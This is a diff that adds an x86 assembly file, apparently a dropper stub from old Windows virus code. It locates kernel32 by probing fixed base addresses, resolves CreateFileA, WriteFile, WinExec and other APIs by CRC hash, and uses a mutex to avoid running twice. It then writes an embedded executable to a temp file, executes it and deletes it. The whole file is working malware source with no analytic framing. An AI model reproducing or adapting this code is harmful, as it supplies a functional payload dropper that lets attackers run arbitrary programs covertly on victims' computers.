@@ -1,0 +1,225 @@
+init:
+       mov edx, 077e00000h
+       call checkbase
+       je __found
+       mov edx, 0bff70000h
+       call checkbase
+       je __found
+       mov edx, 077f00000h
+       call checkbase
+       jne _fudeu2
+  __found:
+       mov ecx, [edx+3ch]
+       mov eax, ecx
+       add eax, edx
+       cmp dwo [eax], "EP"
+       jne _fudeu2
+
+       mov esi, [eax+120]           ;get kernel32 APIs...
+       lea esi, [esi+edx+24]
+       lodsd
+       push eax
+       lodsd
+       push eax
+       lodsd
+       xchg ebx, eax
+       pop ebp                                  ;ebp=RVA table
+       pop ecx                                  ;ecx=number of names
+       lodsd
+       xchg esi, eax                            ;esi=names table
+       xchg esi, ebx                            ;ebx=ordinal table
+       neg edx
+       sub esi, edx
+       sub ebp, edx
+       sub ebx, edx                            ;edx=-kernel32
+       sub edi, edi
+  __loopy:
+       inc edi                                 ;edi=ordinal counter
+       lodsd                                   ;eax=API name string
+       pusha
+       sub eax, edx
+       xchg eax, esi
+       push CRC_INIT                           ;calculate crc of string
+       pop ecx
+  __next_byte:
+       lodsb
+       test al, al
+       jz __done
+       xor cl, al
+       mov al, 8
+  __next_bit:
+       shr ecx, 1
+       jnc __poly
+       xor ecx, CRC_POLY
+  __poly:
+       dec al
+       jnz __next_bit
+       jmp __next_byte
+  __done:
+       sub eax, eax
+       cmp ecx, 12345678h                      ;crcz of API
+     org $-4
+       crc <CreateFileA>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <WriteFile>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <CloseHandle>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <DeleteFileA>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <GetTempPathA>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <GetTempFileNameA>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <CreateMutexA>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <ReleaseMutex>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <GetLastError>
+       je __patch_api
+       inc eax
+       cmp ecx, 12345678h
+     org $-4
+       crc <WinExec>
+       jne  __end_loopy
+
+  __patch_api:
+       call __delta
+  __delta:
+       pop esi
+       lea esi, [esi+eax*4+(ofs _CreateFileA-ofs __delta)]
+       movzx eax, wo [ebx+(edi*2)]             ;get ordinal
+       dec eax
+       mov eax, [ebp+(eax*4)]                  ;get rva
+       sub eax, edx
+       mov [esi], eax                          ;got it!
+  __end_loopy:
+       popa
+       dec ecx
+       jnz __loopy                            ;all APIs scanned
+
+       jmp get_start
+
+checkbase:
+       pushad
+       sub eax, eax
+       call _seh
+       mov esp, [esp+8]
+       sub eax, eax
+       cmp eax, esp
+       jmp _error
+  _seh:
+       push dwo fs:[eax]
+       mov dwo fs:[eax], esp
+       cmp wo [edx], "ZM"
+  _error:
+       pop dwo fs:[eax]
+       pop eax
+       popad
+       ret
+
+
+drop:
+       pop esi
+       sub ebp, ebp
+       sub esp, MAX_PATH*2
+       call __tmp
+       db "HLP",0
+  __tmp:
+       push 1
+       push ebp
+       call [esi-(5+(ofs get_start-ofs _CreateMutex))]
+       push eax
+       call [esi-(5+(ofs get_start-ofs _GetLastError))]
+       test eax, eax
+       jz __ta_ok
+       call [esi-(5+(ofs get_start-ofs _ReleaseMutex))]
+       jmp __fudeu
+  __ta_ok:
+       pop eax
+       push esp
+       push MAX_PATH
+       call [esi-(5+(ofs get_start-ofs _GetTempPath))]
+       lea edi, [esp+eax+4]
+       mov eax, esp
+       push edi
+       push ebp
+       call __tmp0001
+       db "_",0
+  __tmp0001:
+       push eax
+       call [esi-(5+(ofs get_start-ofs _GetTempFileName))]
+       push ebp
+       push 82h
+       push 2                   ;create always
+       push ebp
+       push ebp
+       push 0c0000000h
+       push edi
+       call [esi-(5+(ofs get_start-ofs _CreateFileA))]
+       mov ebx, eax
+       inc eax
+       jz __fudeu
+       push 0
+       push esp
+       xchg ebp, [esp]
+       push ebp
+       push 12345678h
+  pe_size equ dwo $-4
+       push esi
+       push ebx
+       call [esi-(5+(ofs get_start-ofs _WriteFile))]
+       pop eax
+       push ebx
+       call [esi-(5+(ofs get_start-ofs _CloseHandle))]
+       push 0
+       push edi
+       call [esi-(5+(ofs get_start-ofs _WinExec))]
+       push edi
+       call [esi-(5+(ofs get_start-ofs _DeleteFileA))]
+  __fudeu:
+       sub esp, -(MAX_PATH*2)
+  _fudeu2:
+       add esp, 12345678h
+  pushtotal equ dwo $-4
+       popad
+       ret 4
+
+_CreateFileA     dd 0
+_WriteFile       dd 0
+_CloseHandle     dd 0
+_DeleteFileA     dd 0
+_GetTempPath     dd 0
+_GetTempFileName dd 0
+_CreateMutex     dd 0
+_ReleaseMutex    dd 0
+_GetLastError    dd 0
+_WinExec         dd 0
+
+get_start:
+      call drop
+
